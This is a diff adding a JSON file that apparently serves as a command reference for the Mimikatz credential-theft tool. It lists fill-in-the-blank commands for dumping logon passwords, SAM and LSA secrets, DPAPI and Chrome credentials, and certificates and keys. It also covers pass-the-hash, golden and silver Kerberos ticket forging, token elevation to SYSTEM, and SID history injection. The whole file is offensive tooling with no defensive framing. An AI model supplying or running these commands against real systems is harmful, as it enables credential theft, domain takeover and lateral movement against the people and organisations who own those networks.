@@ -1,0 +1,61 @@
+{
+  "Sekurlsa": {
+    "Logonpasswords": "sekurlsa::logonpasswords",
+    "Kerberos Tickets Export": "sekurlsa::tickets /export",
+    "Pass The Hash (RC4)": "sekurlsa::pth /run:cmd /user: /domain: /ntlm:",
+    "Pass The Hash (AES)": "sekurlsa::pth /run:cmd /user: /domain: /aes256:"
+  },
+  "Kerberos": {
+    "List Tickets": "kerberos::list",
+    "Export Tickets": "kerberos::list /export",
+    "Golden Ticket": "kerberos::golden /admin:Administrator /domain: /sid: /krbtgt: /ticket:",
+    "Silver Ticket": "kerberos::golden /domain: /sid: /target: /service: /rc4:",
+    "Purge Tickets": "kerberos::purge"
+  },
+  "Crypto": {
+    "CryptoAPI Info": "crypto::capi",
+    "CNG Info": "crypto::cng",
+    "Export Certificates (User Store)": "crypto::certificates /export",
+    "Export Certificates (Local Machine Store)": "crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE",
+    "Export Keys (User Store)": "crypto::keys /export",
+    "Export Keys (Local Machine Store)": "crypto::keys /machine /export"
+  },
+  "LSADump": {
+    "Dump SAM": "lsadump::sam",
+    "Dump SAM with SYSTEM and SAM paths": "lsadump::sam /system: /sam:",
+    "Dump Secrets": "lsadump::secrets",
+    "Dump LSA": "lsadump::lsa /patch"
+  },
+  "DPAPI": {
+    "Master Keys": "dpapi::masterkey /in: /rpc",
+    "User Credentials": "dpapi::cred /in:",
+    "Protect/Unprotect Blob": "dpapi::blob /in: /unprotect",
+    "List Chrome Logins": "dpapi::chrome"
+  },
+  "Vault": {
+    "List Vaults": "vault::list",
+    "List Vault Credentials": "vault::cred"
+  },
+  "Token": {
+    "List Tokens": "token::list",
+    "Elevate to SYSTEM": "token::elevate",
+    "Impersonate User": "token::impersonate /user:",
+    "Revert to Self": "token::revert"
+  },
+  "SID": {
+    "List Current SID": "sid::list",
+    "Add SID History": "sid::add /sid:",
+    "Remove SID History": "sid::remove /sid:"
+  },
+  "Service": {
+    "List Services": "service::list",
+    "Start Service": "service::start /name:",
+    "Stop Service": "service::stop /name:",
+    "Delete Service": "service::delete /name:"
+  },
+  "Schedule": {
+    "List Scheduled Tasks": "schedule::list",
+    "Create Scheduled Task": "schedule::create /name: /cmd:",
+    "Delete Scheduled Task": "schedule::delete /name:"
+  }
+}
